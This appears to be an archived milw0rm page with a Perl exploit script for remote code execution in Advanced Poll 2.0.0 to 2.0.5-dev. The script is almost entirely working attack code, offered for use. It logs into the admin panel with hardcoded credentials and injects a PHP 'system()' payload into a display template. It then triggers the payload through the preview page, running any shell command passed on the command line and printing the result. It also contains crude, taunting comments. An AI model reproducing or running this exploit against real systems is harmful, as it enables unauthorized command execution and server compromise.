<html><head><title>Advanced Poll <= 2.0.5-dev Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl -w
# Advanced Poll 2.0.0 &gt;= 2.0.5-dev textfile RCE.
#
# date: 30/07/06
# 
# diwou &lt;diwou@phucksys.org&gt;
#
# PHCKSEC (c) 2001-2006.
#
# Hey, what a mad world!
#

use strict;
use warnings;
use LWP::UserAgent;
use MD5;

#
# args: http://url/apoll_path cmd
#
# proxy: export PROXY='http|https://www.my.big.and.famous.proxy:8080/'
# url: http|https://tatget:(port)/phppoll/
#

die(&quot;RTFC! ;)&quot;) unless(@ARGV&gt;1);

my ($lwp,$agent,$out,$res,$url,$cmd)=(undef,undef,undef,undef,$ARGV[0],$ARGV[1]);

my %ipost=
(
	poll_tplset =&gt; 'default',
	'tpl[display_head.html]' =&gt;
&lt;&lt;HEAD
\\&quot;.system(getenv(HTTP_PHP)).exit().\\&quot;
&lt;table width=&quot;\$pollvars[table_width]&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;1&quot; bgcolor=&quot;\$pollvars[bgcolor_fr]&quot;&gt;
  &lt;tr align=&quot;center&quot;&gt;
    &lt;td&gt;&lt;style type=&quot;text/css&quot;&gt;
       &lt;!--
        .input { font-family: \$pollvars[font_face]; font-size: 8pt}
        .links { font-family: \$pollvars[font_face]; font-size: 7.5pt; color: \$pollvars[font_color]}
       --&gt;
      &lt;/style&gt;&lt;font face=&quot;\$pollvars[font_face]&quot; size=&quot;-1&quot; color=&quot;#FFFFFF&quot;&gt;&lt;b&gt;\$pollvars[title]&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr align=&quot;center&quot;&gt;
    &lt;td&gt;
      &lt;table width=&quot;100%&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;2&quot; align=&quot;center&quot; bgcolor=&quot;\$pollvars[bgcolor_tab]&quot;&gt;
        &lt;tr&gt;
          &lt;td height=&quot;40&quot; valign=&quot;middle&quot;&gt;&lt;font face=&quot;\$pollvars[font_face]&quot; color=&quot;\$pollvars[font_color]&quot; size=&quot;1&quot;&gt;&lt;b&gt;\$question&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr align=&quot;right&quot; valign=&quot;top&quot;&gt;
          &lt;td&gt;
            &lt;form method=&quot;post&quot; action=&quot;\$this-&gt;form_forward&quot;&gt;
            &lt;table width=&quot;100%&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; align=&quot;center&quot;&gt;
              &lt;tr valign=&quot;top&quot; align=&quot;center&quot;&gt;
                &lt;td&gt;
                  &lt;table width=&quot;100%&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;1&quot; align=&quot;center&quot;&gt;
HEAD
,
	action   =&gt;  '',
	tplset   =&gt;  'default',
	tpl_type =&gt;  'display',
	session  =&gt;  '',
	uid      =&gt;  1
);

my %epost=
(
	session    =&gt; '',
	uid        =&gt; 1,
	poll_tplst =&gt; 'default',
	tpl_type   =&gt; 'display',
);

my %zday=
(
	username =&gt; 'jakahw4nk4h',
	'pollvars[poll_username]' =&gt; 'jakahw4nk4h',
	password =&gt; 'fuckoff',
	'pollvars[poll_password]' =&gt; ''
);

$zday{'pollvars[poll_password]'}=&amp;md5($zday{password});
$agent=&quot;Hey IDS! i'm gonna fuck your advanced poll right? B===D&quot;; # post method doesnt log it, so doesnt matter.
#$agent=&quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1&quot;;

$lwp=new LWP::UserAgent();
$lwp-&gt;agent($agent);
$lwp-&gt;timeout(10);
$lwp-&gt;protocols_allowed(['http','https']);

if($ENV{PROXY})
{
	$lwp-&gt;proxy(['http','https'],$ENV{PROXY});
	print &quot;Using proxy &quot;.$ENV{PROXY}.&quot;\n&quot;;
}

$url.=&quot;/&quot; if($url!~/\/$/);
$url.=&quot;admin/index.php&quot;;
print &quot;Doing some pretty with &quot;.$url.&quot;...\n\n&quot;;

print &quot;+ generating session...\n&quot;;
$out=$lwp-&gt;post($url,\%zday)-&gt;content();
if($out=~ /index\.php\?session=((.){32})/)
{
	$ipost{'session'}=$epost{'session'}=$1;
	print &quot;  session: &quot;.$ipost{'session'}.&quot;\n&quot;;
	
	$url=~s/index\.php/admin_templates\.php/g;
	print &quot;+ injecting diplay_head.html template...\n&quot;;
	$out=$lwp-&gt;post($url,\%ipost)-&gt;content();
	$epost{'action'}=$1 if($out=~ /&lt;input type=&quot;submit&quot; name=&quot;action&quot; value=&quot;(.*)&quot; class=&quot;button&quot;&gt;/);
	print &quot;  button: &quot;.$epost{'action'}.&quot;\n&quot;;

	$url=~s/admin_templates\.php/admin_preview\.php/g;
	print &quot;+ executing...\n&quot;;
	$out=$lwp-&gt;post($url,\%epost,PHP =&gt; &quot;echo BOCE;&quot;.$cmd.&quot;;echo EOCE&quot;)-&gt;content();

	print &quot;-- BOCE --\n&quot;;
	foreach $out (split(/\n/,$out))
	{
		$res=1,next if($out=~/BOCE/);
		$res=0,next if($out=~/EOCE/);
		print $out.&quot;\n&quot; if($res);
	}
	print &quot;-- EOCE --\n&quot;;
}
else
{
	print &quot;don't worry, u can improve me! eh eh eh :D?\n&quot;;
}

sub md5
{
	$_=new MD5;
	$_-&gt;add(@_);
	return unpack(&quot;H*&quot;,$_-&gt;digest());
}

# milw0rm.com [2007-02-13]</pre></html>